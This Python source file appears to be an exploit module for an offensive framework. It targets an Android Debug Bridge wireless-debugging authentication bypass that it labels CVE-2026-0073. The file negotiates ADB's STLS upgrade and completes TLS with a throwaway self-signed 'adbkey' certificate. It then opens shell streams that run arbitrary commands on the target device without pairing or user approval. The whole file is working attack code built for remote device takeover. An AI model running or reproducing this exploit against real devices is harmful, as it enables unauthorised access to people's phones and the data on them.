#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ADB STLS/TLS helper for CVE-2026-0073 style authentication checks."""

from __future__ import annotations

import datetime
import io
import os
import socket
import ssl
import struct
import tempfile
import threading
from dataclasses import dataclass
from typing import Callable, Optional, Tuple

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID


ADB_VERSION = 0x01000001
ADB_MAXDATA = 256 * 1024
ADB_BANNER = (
    b"host::features=shell_v2,cmd,stat_v2,ls_v2,fixed_push_mkdir,apex,"
    b"abb,abb_exec,remount_shell,track_app,sendrecv_v2,sendrecv_v2_brotli,"
    b"sendrecv_v2_lz4,sendrecv_v2_zstd,sendrecv_v2_dry_run_send,"
    b"openscreen_mdns,delayed_ack"
)

DELAYED_ACK_WINDOW = 32 * 1024 * 1024
MAX_PACKET_PAYLOAD = 64 * 1024 * 1024

CMD_CNXN = 0x4E584E43
CMD_STLS = 0x534C5453
CMD_AUTH = 0x41555448
CMD_OPEN = 0x4E45504F
CMD_OKAY = 0x59414B4F
CMD_WRTE = 0x45545257
CMD_CLSE = 0x45534C43


class AdbError(Exception):
    """Base class for ADB protocol errors."""


class AdbAuthPathError(AdbError):
    """Raised when the target is not on the STLS wireless-debugging path."""


class AdbProtocolError(AdbError):
    """Raised when ADB packet framing or state is unexpected."""


@dataclass
class AdbPacket:
    cmd: int
    arg0: int
    arg1: int
    data: bytes = b""


def command_name(cmd: int) -> str:
    names = {
        CMD_CNXN: "CNXN",
        CMD_STLS: "STLS",
        CMD_AUTH: "AUTH",
        CMD_OPEN: "OPEN",
        CMD_OKAY: "OKAY",
        CMD_WRTE: "WRTE",
        CMD_CLSE: "CLSE",
    }
    return names.get(cmd, f"0x{cmd:08x}")


def checksum(data: bytes) -> int:
    return sum(data) & 0xFFFFFFFF


def pack_packet(cmd: int, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    data = data or b""
    header = struct.pack(
        "<IIIIII",
        cmd,
        arg0,
        arg1,
        len(data),
        checksum(data),
        cmd ^ 0xFFFFFFFF,
    )
    return header + data


def recv_exact(sock, size: int) -> bytes:
    buf = bytearray()
    while len(buf) < size:
        chunk = sock.recv(size - len(buf))
        if not chunk:
            raise ConnectionError(f"connection closed after {len(buf)}/{size} bytes")
        buf.extend(chunk)
    return bytes(buf)


def recv_packet(sock) -> AdbPacket:
    raw_header = recv_exact(sock, 24)
    cmd, arg0, arg1, length, csum, magic = struct.unpack("<IIIIII", raw_header)
    if magic != (cmd ^ 0xFFFFFFFF):
        raise AdbProtocolError(f"invalid magic for {command_name(cmd)}")
    if length > MAX_PACKET_PAYLOAD:
        raise AdbProtocolError(f"ADB packet too large: {length} bytes")

    data = recv_exact(sock, length) if length else b""
    if checksum(data) != csum:
        raise AdbProtocolError(f"invalid checksum for {command_name(cmd)}")
    return AdbPacket(cmd, arg0, arg1, data)


def make_ec_client_cert() -> Tuple[bytes, bytes]:
    """Generate a temporary EC P-256 client cert named like a normal adbkey."""
    key = ec.generate_private_key(ec.SECP256R1())
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "adbkey")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(minutes=1))
        .not_valid_after(now + datetime.timedelta(days=1))
        .sign(key, hashes.SHA256())
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM)
    key_pem = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    )
    return cert_pem, key_pem


class AdbTlsAuthBypassClient:
    """Small ADB client for the STLS/TLS path used by CVE-2026-0073."""

    def __init__(
        self,
        host: str,
        port: int = 5555,
        timeout: float = 10.0,
        logger: Optional[Callable[[str], None]] = None,
    ):
        self.host = host
        self.port = int(port)
        self.timeout = float(timeout)
        self.logger = logger
        self.sock = None
        self.tls = None
        self.device_banner = ""
        self._next_local_id = 1

    def _log(self, msg: str) -> None:
        if self.logger:
            self.logger(msg)

    def _send(self, sock, data: bytes) -> None:
        sock.sendall(data)

    def _new_local_id(self) -> int:
        local_id = self._next_local_id
        self._next_local_id += 1
        return local_id

    def connect_cleartext(self) -> int:
        """Start ADB in cleartext and return the negotiated STLS version."""
        self.close()
        self._log(f"connecting to {self.host}:{self.port}")
        self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        self.sock.settimeout(self.timeout)

        self._send(self.sock, pack_packet(CMD_CNXN, ADB_VERSION, ADB_MAXDATA, ADB_BANNER))

        for _ in range(4):
            pkt = recv_packet(self.sock)
            self._log(f"<- {command_name(pkt.cmd)} arg0=0x{pkt.arg0:x}")
            if pkt.cmd == CMD_STLS:
                self._send(self.sock, pack_packet(CMD_STLS, pkt.arg0, 0))
                return pkt.arg0
            if pkt.cmd == CMD_AUTH:
                raise AdbAuthPathError(
                    "target answered AUTH instead of STLS; wireless-debugging TLS path was not reached"
                )
            if pkt.cmd == CMD_CNXN:
                self.device_banner = pkt.data.decode(errors="replace")
                continue
            raise AdbProtocolError(f"unexpected {command_name(pkt.cmd)} during STLS negotiation")

        raise AdbProtocolError("target did not offer STLS")

    def upgrade_tls(self, cert_pem: bytes, key_pem: bytes) -> None:
        if not self.sock:
            raise AdbProtocolError("cleartext socket is not connected")

        cert_path = ""
        key_path = ""
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".pem") as cert_file:
                cert_file.write(cert_pem)
                cert_path = cert_file.name
            with tempfile.NamedTemporaryFile(delete=False, suffix=".pem") as key_file:
                key_file.write(key_pem)
                key_path = key_file.name

            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1_3
            ctx.maximum_version = ssl.TLSVersion.TLSv1_3
            ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)

            self.tls = ctx.wrap_socket(self.sock, server_hostname=self.host)
            self.tls.settimeout(self.timeout)
            self._log(f"TLS handshake complete: {self.tls.version()}")
        finally:
            for path in (cert_path, key_path):
                if path:
                    try:
                        os.unlink(path)
                    except OSError:
                        pass

    def post_tls_cnxn(self) -> None:
        if not self.tls:
            raise AdbProtocolError("TLS socket is not connected")

        for _ in range(6):
            pkt = recv_packet(self.tls)
            self._log(f"<- {command_name(pkt.cmd)} inside TLS")
            if pkt.cmd == CMD_CNXN:
                self.device_banner = pkt.data.decode(errors="replace")
                self._drain_stls_notifications()
                return
            if pkt.cmd == CMD_STLS:
                continue
            raise AdbProtocolError(f"expected CNXN/STLS inside TLS, got {command_name(pkt.cmd)}")

        raise AdbProtocolError("target did not send post-TLS CNXN")

    def _drain_stls_notifications(self) -> None:
        old_timeout = self.tls.gettimeout()
        try:
            self.tls.settimeout(0.05)
            for _ in range(4):
                try:
                    pkt = recv_packet(self.tls)
                except (socket.timeout, OSError, ConnectionError):
                    break
                if pkt.cmd != CMD_STLS:
                    break
        finally:
            self.tls.settimeout(old_timeout)

    def authenticate(self) -> None:
        cert_pem, key_pem = make_ec_client_cert()
        self.connect_cleartext()
        self.upgrade_tls(cert_pem, key_pem)
        self.post_tls_cnxn()

    def _recv_skip_stls(self) -> AdbPacket:
        if not self.tls:
            raise AdbProtocolError("TLS socket is not connected")
        for _ in range(8):
            pkt = recv_packet(self.tls)
            if pkt.cmd != CMD_STLS:
                return pkt
        raise AdbProtocolError("too many STLS notifications")

    def run_command(self, command: str) -> str:
        if not self.tls:
            raise AdbProtocolError("TLS socket is not connected")

        local_id = self._new_local_id()
        payload = f"shell:{command}\x00".encode()
        self._send(self.tls, pack_packet(CMD_OPEN, local_id, DELAYED_ACK_WINDOW, payload))

        pkt = self._recv_skip_stls()
        if pkt.cmd != CMD_OKAY:
            raise AdbProtocolError(f"command OPEN rejected with {command_name(pkt.cmd)}")

        remote_id = pkt.arg0
        self._send(self.tls, pack_packet(CMD_OKAY, local_id, remote_id))

        output = io.BytesIO()
        while True:
            pkt = recv_packet(self.tls)
            if pkt.cmd == CMD_STLS:
                continue
            if pkt.cmd == CMD_WRTE:
                output.write(pkt.data)
                self._send(self.tls, pack_packet(CMD_OKAY, local_id, remote_id))
                continue
            if pkt.cmd == CMD_OKAY:
                continue
            if pkt.cmd == CMD_CLSE:
                try:
                    self._send(self.tls, pack_packet(CMD_CLSE, local_id, remote_id))
                except OSError:
                    pass
                break
            raise AdbProtocolError(f"unexpected {command_name(pkt.cmd)} while reading command output")

        return output.getvalue().decode(errors="replace")

    def close(self) -> None:
        tls = self.tls
        sock = self.sock
        self.tls = None
        self.sock = None
        for item in (tls, sock):
            if item:
                try:
                    item.close()
                except OSError:
                    pass


class AdbBypassDevice:
    """ppadb-like adapter exposing device.shell(command) for KittySploit sessions."""

    def __init__(
        self,
        host: str,
        port: int = 5555,
        timeout: float = 10.0,
        logger: Optional[Callable[[str], None]] = None,
    ):
        self.host = host
        self.port = int(port)
        self.timeout = float(timeout)
        self.logger = logger
        self.serial = f"{host}:{port}"
        self.client: Optional[AdbTlsAuthBypassClient] = None
        self._lock = threading.RLock()

    def connect(self) -> None:
        with self._lock:
            if self.client and self.client.tls:
                return
            self.client = AdbTlsAuthBypassClient(self.host, self.port, self.timeout, self.logger)
            self.client.authenticate()
            if self.client.device_banner:
                self.serial = self.client.device_banner.split(";", 1)[0] or self.serial

    def shell(self, command: str) -> str:
        command = str(command or "")
        with self._lock:
            self.connect()
            try:
                return self.client.run_command(command)
            except Exception:
                self.close()
                raise

    def close(self) -> None:
        with self._lock:
            if self.client:
                self.client.close()
            self.client = None
